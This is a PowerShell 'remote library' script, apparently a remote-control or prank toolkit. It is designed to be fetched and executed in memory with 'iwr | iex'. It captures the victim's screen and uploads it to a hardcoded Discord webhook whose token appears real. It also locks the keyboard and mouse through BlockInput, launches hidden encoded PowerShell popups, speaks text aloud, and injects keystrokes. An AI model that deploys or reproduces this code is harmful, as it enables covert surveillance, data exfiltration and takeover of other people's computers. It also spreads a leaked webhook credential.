# Remote Library PowerShell Script
# This script defines session‑only functions that are available after loading via
#   iwr <raw_github_url> | iex
# No persistence is performed; functions exist only for the current PowerShell session.

# Helper: Send a file (image) to a Discord webhook
function Invoke-DiscordWebhook {
    param (
        [Parameter(Mandatory = $true)][string]$WebhookUrl,
        [Parameter(Mandatory = $true)][string]$FilePath
    )
    try {
        # Using curl.exe properly formats the multipart/form-data for Discord
        & curl.exe -s -F "file=@$FilePath" $WebhookUrl | Out-Null
    }
    catch {
        Write-Error "Failed to send webhook: $_"
    }
}

# Command: ss – capture screenshot and post to Discord webhook
function ss {
    param (
        [string]$WebhookUrl = "https://discord.com/api/webhooks/1400512221276147774/eo5r_JV1-r6QdgS1wlngW2-0Kbh3UV_iBcTh-yl9mXUMRuWaWVI4RfZnud9jPk8JQYCt"
    )
    # Use .NET to capture the primary screen
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
    $tempPath = [System.IO.Path]::Combine($env:TEMP, "screenshot_{0}.png" -f ([guid]::NewGuid()))
    $bitmap.Save($tempPath, [System.Drawing.Imaging.ImageFormat]::Png)
    Invoke-DiscordWebhook -WebhookUrl $WebhookUrl -FilePath $tempPath
    Remove-Item $tempPath -ErrorAction SilentlyContinue
    echo "Your wish is my command."
}

function Init-BlockInput {
    if (-not ("Win32.BlockInputHelper" -as [type])) {
        Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern bool BlockInput(bool fBlockIt);' -Name "BlockInputHelper" -Namespace "Win32"
    }
}

# Command: block - blocks keyboard/mouse input for a specified duration
function block {
    param([int]$Seconds = 5)
    Init-BlockInput
    $result = [Win32.BlockInputHelper]::BlockInput($true)
    if (-not $result) {
        Write-Warning "Failed to block input. Please run PowerShell as Administrator."
        return
    }
    echo "blocked for $Seconds secs"
    Start-Sleep -Seconds $Seconds
    [Win32.BlockInputHelper]::BlockInput($false) | Out-Null
    echo "unblocked gng"
}

# Command: unblock - manually restores keyboard/mouse input
function unblock {
    Init-BlockInput
    [Win32.BlockInputHelper]::BlockInput($false) | Out-Null
    echo "unblocked gng"
}

# Command: popup - displays a popup message box
function popup {
    param(
        [Parameter(ValueFromRemainingArguments = $true)]
        [string[]]$Text
    )
    $message = $Text -join " "
    if (-not $message) { $message = "Hello!" }

    $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('$($message.Replace("'", "''"))', 'Message', 'OK', 'Information')"))
    Start-Process powershell -ArgumentList "-WindowStyle Hidden", "-EncodedCommand", $encoded
    
    echo "Your wish is my command."
}

# Command: tts - speaks the text aloud
function tts {
    param(
        [Parameter(ValueFromRemainingArguments = $true)]
        [string[]]$Text
    )
    $message = $Text -join " "
    if (-not $message) { $message = "Hello!" }

    Add-Type -AssemblyName System.Speech
    $synth = New-Object System.Speech.Synthesis.SpeechSynthesizer
    $synth.SpeakAsync($message) | Out-Null

    echo "Your wish is my command."
}

# Command: press - simulates keyboard key presses
function press {
    param(
        [Parameter(ValueFromRemainingArguments = $true)]
        [string[]]$Keys
    )
    if (-not $Keys) { return }

    $text = $Keys -join " "
    if ($text.ToLower() -match "windows") {
        if (-not ("Win32.Keyboard" -as [type])) {
            $Source = @"
using System.Runtime.InteropServices;
namespace Win32 {
    public class Keyboard {
        [DllImport("user32.dll")]
        public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, int dwExtraInfo);
    }
}
"@
            Add-Type -TypeDefinition $Source
        }
        $KEYEVENTF_KEYUP = 2
        $VK_LWIN = 0x5B
        
        [Win32.Keyboard]::keybd_event($VK_LWIN, 0, 0, 0)
        foreach ($k in $Keys) {
            if ($k.ToLower() -ne "windows" -and $k.Length -eq 1) {
                $vk = [int][char]$k.ToUpper()[0]
                [Win32.Keyboard]::keybd_event($vk, 0, 0, 0)
                [Win32.Keyboard]::keybd_event($vk, 0, $KEYEVENTF_KEYUP, 0)
            }
        }
        [Win32.Keyboard]::keybd_event($VK_LWIN, 0, $KEYEVENTF_KEYUP, 0)
    }
    else {
        Add-Type -AssemblyName System.Windows.Forms
        $mapped = ""
        foreach ($k in $Keys) {
            switch ($k.ToLower()) {
                "enter" { $mapped += "{ENTER}" }
                "esc" { $mapped += "{ESC}" }
                "tab" { $mapped += "{TAB}" }
                "space" { $mapped += " " }
                "ctrl" { $mapped += "^" }
                "alt" { $mapped += "%" }
                "shift" { $mapped += "+" }
                "up" { $mapped += "{UP}" }
                "down" { $mapped += "{DOWN}" }
                "left" { $mapped += "{LEFT}" }
                "right" { $mapped += "{RIGHT}" }
                "backspace" { $mapped += "{BACKSPACE}" }
                default { $mapped += $k }
            }
        }
        if ($mapped) {
            [System.Windows.Forms.SendKeys]::SendWait($mapped)
        }
    }
    echo "Your wish is my command."
}

# Help command – list available remote‑library commands
function hlp {
    $commands = @{
        "ss"      = "capture a screenshot and send it to the webhook."
        "block"   = "block keyboard and mouse input for a duration (default 5s)"
        "unblock" = "manually unblock keyboard and mouse input"
        "popup"   = "open a message popup"
        "tts"     = "just text to speech twin"
        "press"   = "simulate typing keys (e.g. press windows d or press enter)"
        "hlp"     = "js shows all the commands"
    }
    Write-Host "Remote Library Commands:`n"
    foreach ($k in $commands.Keys) {
        Write-Host "  $k - $($commands[$k])"
    }
}

# Export the command list to a global variable for easy enumeration (optional)
$global:RemoteLibCommands = @('ss', 'block', 'unblock', 'popup', 'tts', 'press', 'hlp')

# End of remote_lib.ps1
